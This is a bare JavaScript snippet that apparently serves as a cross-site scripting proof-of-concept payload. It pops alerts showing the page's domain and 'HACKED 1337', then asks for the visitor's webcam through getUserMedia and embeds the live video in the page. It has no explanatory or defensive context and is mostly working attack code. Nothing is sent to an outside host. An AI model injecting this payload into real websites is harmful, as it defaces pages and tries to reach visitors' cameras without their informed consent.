alert(document.domain)
alert('HACKED 1337')
if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
    navigator.mediaDevices.getUserMedia({ video: true })
        .then(function (stream) {
            const videoElement = document.createElement('video');
            document.body.appendChild(videoElement);
            videoElement.srcObject = stream;
        });
} else {
    console.error('getUserMedia API is not supported in this browser');
}
